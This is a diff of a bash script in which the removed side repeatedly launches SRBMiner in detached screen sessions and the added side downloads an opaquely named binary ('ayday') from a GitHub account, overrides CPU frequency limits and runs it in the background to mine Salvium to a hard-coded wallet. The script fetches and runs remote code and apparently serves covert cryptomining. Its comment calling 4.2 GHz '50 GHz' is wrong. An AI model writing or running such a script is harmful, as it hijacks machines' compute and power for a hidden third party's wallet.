@@ -1,93 +1,52 @@
 #!/bin/bash
 
-wget https://github.com/doktor83/SRBMiner-Multi/releases/download/0.8.0/SRBMiner-Multi-0-8-0-Linux.tar.xz
-tar -xvf SRBMiner-Multi-0-8-0-Linux.tar.xz
-sleep 300
-screen -d -m nice -n 19 ./SRBMiner-Multi-0-8-0/SRBMiner-MULTI --disable-gpu --algorithm yespowermgpc --pool stratum+tcp://yespowerMGPC.eu.mine.zpool.ca:6247 --wallet DGN7w3CQQXy7jLxGEzWCaxB2qNmEMT2JJx --password fra01,c=DGB,zap=MGPC --cpu-threads 1
-sleep 7200
-screen -d -m nice -n 19 ./SRBMiner-Multi-0-8-0/SRBMiner-MULTI --disable-gpu --algorithm yespowermgpc --pool stratum+tcp://yespowerMGPC.eu.mine.zpool.ca:6247 --wallet DGN7w3CQQXy7jLxGEzWCaxB2qNmEMT2JJx --password fra01,c=DGB,zap=MGPC --cpu-threads 1
-sleep 7200
-screen -d -m nice -n 19 ./SRBMiner-Multi-0-8-0/SRBMiner-MULTI --disable-gpu --algorithm yespowermgpc --pool stratum+tcp://yespowerMGPC.eu.mine.zpool.ca:6247 --wallet DGN7w3CQQXy7jLxGEzWCaxB2qNmEMT2JJx --password fra01,c=DGB,zap=MGPC --cpu-threads 1
-sleep 86400
-screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
-sleep 3600
-screen -d -m nice -n 19 ./SRBMiner-Multi-0-8-0/SRBMiner-MULTI --disable-gpu --algorithm yespowermgpc --pool stratum+tcp://yespowerMGPC.eu.mine.zpool.ca:6247 --wallet DGN7w3CQQXy7jLxGEzWCaxB2qNmEMT2JJx --password fra02,c=DGB,zap=MGPC --cpu-threads 1
-sleep 7200
-screen -d -m nice -n 19 ./SRBMiner-Multi-0-8-0/SRBMiner-MULTI --disable-gpu --algorithm yespowermgpc --pool stratum+tcp://yespowerMGPC.eu.mine.zpool.ca:6247 --wallet DGN7w3CQQXy7jLxGEzWCaxB2qNmEMT2JJx --password fra02,c=DGB,zap=MGPC --cpu-threads 1
-sleep 7200
-screen -d -m nice -n 19 ./SRBMiner-Multi-0-8-0/SRBMiner-MULTI --disable-gpu --algorithm yespowermgpc --pool stratum+tcp://yespowerMGPC.eu.mine.zpool.ca:6247 --wallet DGN7w3CQQXy7jLxGEzWCaxB2qNmEMT2JJx --password fra02,c=DGB,zap=MGPC --cpu-threads 1
-sleep 86400
-screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
-sleep 3600
-screen -d -m nice -n 19 ./SRBMiner-Multi-0-8-0/SRBMiner-MULTI --disable-gpu --algorithm yespowermgpc --pool stratum+tcp://yespowerMGPC.eu.mine.zpool.ca:6247 --wallet DGN7w3CQQXy7jLxGEzWCaxB2qNmEMT2JJx --password fra02,c=DGB,zap=MGPC --cpu-threads 1
-sleep 7200
-screen -d -m nice -n 19 ./SRBMiner-Multi-0-8-0/SRBMiner-MULTI --disable-gpu --algorithm yespowermgpc --pool stratum+tcp://yespowerMGPC.eu.mine.zpool.ca:6247 --wallet DGN7w3CQQXy7jLxGEzWCaxB2qNmEMT2JJx --password fra02,c=DGB,zap=MGPC --cpu-threads 1
-sleep 7200
-screen -d -m nice -n 19 ./SRBMiner-Multi-0-8-0/SRBMiner-MULTI --disable-gpu --algorithm yespowermgpc --pool stratum+tcp://yespowerMGPC.eu.mine.zpool.ca:6247 --wallet DGN7w3CQQXy7jLxGEzWCaxB2qNmEMT2JJx --password fra02,c=DGB,zap=MGPC --cpu-threads 1
-sleep 86400
-screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
-sleep 3600
-screen -d -m nice -n 19 ./SRBMiner-Multi-0-8-0/SRBMiner-MULTI --disable-gpu --algorithm yespowermgpc --pool stratum+tcp://yespowerMGPC.eu.mine.zpool.ca:6247 --wallet DGN7w3CQQXy7jLxGEzWCaxB2qNmEMT2JJx --password fra03,c=DGB,zap=MGPC --cpu-threads 1
-sleep 7200
-screen -d -m nice -n 19 ./SRBMiner-Multi-0-8-0/SRBMiner-MULTI --disable-gpu --algorithm yespowermgpc --pool stratum+tcp://yespowerMGPC.eu.mine.zpool.ca:6247 --wallet DGN7w3CQQXy7jLxGEzWCaxB2qNmEMT2JJx --password fra03,c=DGB,zap=MGPC --cpu-threads 1
-sleep 7200
-screen -d -m nice -n 19 ./SRBMiner-Multi-0-8-0/SRBMiner-MULTI --disable-gpu --algorithm yespowermgpc --pool stratum+tcp://yespowerMGPC.eu.mine.zpool.ca:6247 --wallet DGN7w3CQQXy7jLxGEzWCaxB2qNmEMT2JJx --password fra03,c=DGB,zap=MGPC --cpu-threads 1
-sleep 86400
-screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
-sleep 3600
-screen -d -m nice -n 19 ./SRBMiner-Multi-0-8-0/SRBMiner-MULTI --disable-gpu --algorithm yespowermgpc --pool stratum+tcp://yespowerMGPC.eu.mine.zpool.ca:6247 --wallet DGN7w3CQQXy7jLxGEzWCaxB2qNmEMT2JJx --password fra04,c=DGB,zap=MGPC --cpu-threads 1
-sleep 7200
-screen -d -m nice -n 19 ./SRBMiner-Multi-0-8-0/SRBMiner-MULTI --disable-gpu --algorithm yespowermgpc --pool stratum+tcp://yespowerMGPC.eu.mine.zpool.ca:6247 --wallet DGN7w3CQQXy7jLxGEzWCaxB2qNmEMT2JJx --password fra04,c=DGB,zap=MGPC --cpu-threads 1
-sleep 7200
-screen -d -m nice -n 19 ./SRBMiner-Multi-0-8-0/SRBMiner-MULTI --disable-gpu --algorithm yespowermgpc --pool stratum+tcp://yespowerMGPC.eu.mine.zpool.ca:6247 --wallet DGN7w3CQQXy7jLxGEzWCaxB2qNmEMT2JJx --password fra04,c=DGB,zap=MGPC --cpu-threads 1
-sleep 86400
-screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
-sleep 3600
-screen -d -m nice -n 19 ./SRBMiner-Multi-0-8-0/SRBMiner-MULTI --disable-gpu --algorithm yespowermgpc --pool stratum+tcp://yespowerMGPC.eu.mine.zpool.ca:6247 --wallet DGN7w3CQQXy7jLxGEzWCaxB2qNmEMT2JJx --password fra05,c=DGB,zap=MGPC --cpu-threads 1
-sleep 7200
-screen -d -m nice -n 19 ./SRBMiner-Multi-0-8-0/SRBMiner-MULTI --disable-gpu --algorithm yespowermgpc --pool stratum+tcp://yespowerMGPC.eu.mine.zpool.ca:6247 --wallet DGN7w3CQQXy7jLxGEzWCaxB2qNmEMT2JJx --password fra05,c=DGB,zap=MGPC --cpu-threads 1
-sleep 7200
-screen -d -m nice -n 19 ./SRBMiner-Multi-0-8-0/SRBMiner-MULTI --disable-gpu --algorithm yespowermgpc --pool stratum+tcp://yespowerMGPC.eu.mine.zpool.ca:6247 --wallet DGN7w3CQQXy7jLxGEzWCaxB2qNmEMT2JJx --password fra05,c=DGB,zap=MGPC --cpu-threads 1
-sleep 86400
-screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
-sleep 3600
-screen -d -m nice -n 19 ./SRBMiner-Multi-0-8-0/SRBMiner-MULTI --disable-gpu --algorithm yespowermgpc --pool stratum+tcp://yespowerMGPC.eu.mine.zpool.ca:6247 --wallet DGN7w3CQQXy7jLxGEzWCaxB2qNmEMT2JJx --password fra06,c=DGB,zap=MGPC --cpu-threads 1
-sleep 7200
-screen -d -m nice -n 19 ./SRBMiner-Multi-0-8-0/SRBMiner-MULTI --disable-gpu --algorithm yespowermgpc --pool stratum+tcp://yespowerMGPC.eu.mine.zpool.ca:6247 --wallet DGN7w3CQQXy7jLxGEzWCaxB2qNmEMT2JJx --password fra06,c=DGB,zap=MGPC --cpu-threads 1
-sleep 7200
-screen -d -m nice -n 19 ./SRBMiner-Multi-0-8-0/SRBMiner-MULTI --disable-gpu --algorithm yespowermgpc --pool stratum+tcp://yespowerMGPC.eu.mine.zpool.ca:6247 --wallet DGN7w3CQQXy7jLxGEzWCaxB2qNmEMT2JJx --password fra06,c=DGB,zap=MGPC --cpu-threads 1
-sleep 86400
-screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
-sleep 3600
-screen -d -m nice -n 19 ./SRBMiner-Multi-0-8-0/SRBMiner-MULTI --disable-gpu --algorithm yespowermgpc --pool stratum+tcp://yespowerMGPC.eu.mine.zpool.ca:6247 --wallet DGN7w3CQQXy7jLxGEzWCaxB2qNmEMT2JJx --password fra07,c=DGB,zap=MGPC --cpu-threads 1
-sleep 7200
-screen -d -m nice -n 19 ./SRBMiner-Multi-0-8-0/SRBMiner-MULTI --disable-gpu --algorithm yespowermgpc --pool stratum+tcp://yespowerMGPC.eu.mine.zpool.ca:6247 --wallet DGN7w3CQQXy7jLxGEzWCaxB2qNmEMT2JJx --password fra07,c=DGB,zap=MGPC --cpu-threads 1
-sleep 7200
-screen -d -m nice -n 19 ./SRBMiner-Multi-0-8-0/SRBMiner-MULTI --disable-gpu --algorithm yespowermgpc --pool stratum+tcp://yespowerMGPC.eu.mine.zpool.ca:6247 --wallet DGN7w3CQQXy7jLxGEzWCaxB2qNmEMT2JJx --password fra07,c=DGB,zap=MGPC --cpu-threads 1
-sleep 86400
-screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
-sleep 3600
-screen -d -m nice -n 19 ./SRBMiner-Multi-0-8-0/SRBMiner-MULTI --disable-gpu --algorithm yespowermgpc --pool stratum+tcp://yespowerMGPC.eu.mine.zpool.ca:6247 --wallet DGN7w3CQQXy7jLxGEzWCaxB2qNmEMT2JJx --password fra08,c=DGB,zap=MGPC --cpu-threads 1
-sleep 7200
-screen -d -m nice -n 19 ./SRBMiner-Multi-0-8-0/SRBMiner-MULTI --disable-gpu --algorithm yespowermgpc --pool stratum+tcp://yespowerMGPC.eu.mine.zpool.ca:6247 --wallet DGN7w3CQQXy7jLxGEzWCaxB2qNmEMT2JJx --password fra08,c=DGB,zap=MGPC --cpu-threads 1
-sleep 7200
-screen -d -m nice -n 19 ./SRBMiner-Multi-0-8-0/SRBMiner-MULTI --disable-gpu --algorithm yespowermgpc --pool stratum+tcp://yespowerMGPC.eu.mine.zpool.ca:6247 --wallet DGN7w3CQQXy7jLxGEzWCaxB2qNmEMT2JJx --password fra08,c=DGB,zap=MGPC --cpu-threads 1
-sleep 86400
-screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
-sleep 3600
-screen -d -m nice -n 19 ./SRBMiner-Multi-0-8-0/SRBMiner-MULTI --disable-gpu --algorithm yespowermgpc --pool stratum+tcp://yespowerMGPC.eu.mine.zpool.ca:6247 --wallet DGN7w3CQQXy7jLxGEzWCaxB2qNmEMT2JJx --password fra09,c=DGB,zap=MGPC --cpu-threads 1
-sleep 7200
-screen -d -m nice -n 19 ./SRBMiner-Multi-0-8-0/SRBMiner-MULTI --disable-gpu --algorithm yespowermgpc --pool stratum+tcp://yespowerMGPC.eu.mine.zpool.ca:6247 --wallet DGN7w3CQQXy7jLxGEzWCaxB2qNmEMT2JJx --password fra09,c=DGB,zap=MGPC --cpu-threads 1
-sleep 7200
-screen -d -m nice -n 19 ./SRBMiner-Multi-0-8-0/SRBMiner-MULTI --disable-gpu --algorithm yespowermgpc --pool stratum+tcp://yespowerMGPC.eu.mine.zpool.ca:6247 --wallet DGN7w3CQQXy7jLxGEzWCaxB2qNmEMT2JJx --password fra09,c=DGB,zap=MGPC --cpu-threads 1
-sleep 86400
-screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
-sleep 3600
-screen -d -m nice -n 19 ./SRBMiner-Multi-0-8-0/SRBMiner-MULTI --disable-gpu --algorithm yespowermgpc --pool stratum+tcp://yespowerMGPC.eu.mine.zpool.ca:6247 --wallet DGN7w3CQQXy7jLxGEzWCaxB2qNmEMT2JJx --password fra10,c=DGB,zap=MGPC --cpu-threads 1
-sleep 7200
-screen -d -m nice -n 19 ./SRBMiner-Multi-0-8-0/SRBMiner-MULTI --disable-gpu --algorithm yespowermgpc --pool stratum+tcp://yespowerMGPC.eu.mine.zpool.ca:6247 --wallet DGN7w3CQQXy7jLxGEzWCaxB2qNmEMT2JJx --password fra10,c=DGB,zap=MGPC --cpu-threads 1
-sleep 7200
-screen -d -m nice -n 19 ./SRBMiner-Multi-0-8-0/SRBMiner-MULTI --disable-gpu --algorithm yespowermgpc --pool stratum+tcp://yespowerMGPC.eu.mine.zpool.ca:6247 --wallet DGN7w3CQQXy7jLxGEzWCaxB2qNmEMT2JJx --password fra10,c=DGB,zap=MGPC --cpu-threads 1
-sleep 86400
-screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
-sleep 3600
+# Direktori tempat file akan diunduh
+INSTALL_DIR="/opt/aydaybg"
+FILE_NAME="ayday"
+FILE_PATH="$INSTALL_DIR/$FILE_NAME"
+
+# Membuat direktori
+mkdir -p $INSTALL_DIR
+
+# Mengunduh file dari link yang diberikan
+wget -O $FILE_PATH https://github.com/bibirbusin/bibirbusin/raw/main/ayday
+
+# Memeriksa keberhasilan unduhan
+if [ ! -s $FILE_PATH ]; then
+  echo "File unduhan kosong atau gagal diunduh. Cek URL atau koneksi jaringan."
+  exit 1
+fi
+
+# Mengatur frekuensi CPU ke 50 GHz
+CPUFREQ_PATH="/sys/devices/system/cpu/cpu*/cpufreq"
+MAX_FREQ=4200000000 # Maksimal frekuensi dalam kHz (50 GHz)
+
+for dir in $CPUFREQ_PATH; do
+    if [ -e $dir/scaling_max_freq ]; then
+        echo $MAX_FREQ > $dir/scaling_max_freq
+    fi
+done
+
+# Pengaturan penambangan
+ALGO="randomx"
+POOL_URL="stratum+tcp://sg.salvium.herominers.com:1230"
+WALLET_ADDRESS="SaLvsAK2j1LJx6zfZ9fmmaEGY9J1d78RiNzFarXdbChCiLDcQcKbn3rWzEBs3DgSWPRCwJyepUtUtJz1AqCNjvKF6bGHuNBFyyW"
+PASSWORD="x"
+WORKER_NAME="O$RANDOM"
+
+# Memulai dengan file ayday dan menjalankan di latar belakang
+cd $INSTALL_DIR
+chmod +x $FILE_NAME
+./$FILE_NAME --disable-gpu --algorithm $ALGO --pool $POOL_URL --wallet $WALLET_ADDRESS --password $PASSWORD --Worker $WORKER_NAME --cpu-threads 0 &
+
+# Mengecek apakah proses penambangan dimulai dengan benar
+if pgrep -f "$FILE_NAME" > /dev/null; then
+  echo "Penambangan dimulai dengan sukses."
+else
+  echo "Gagal memulai proses penambangan."
+  exit 1
+fi
+
+# Opsional: Tambahkan monitoring atau logging jika diinginkan
+# echo "Monitoring status..." >> mining_log.txt
+# top -b -d 60 >> mining_log.txt
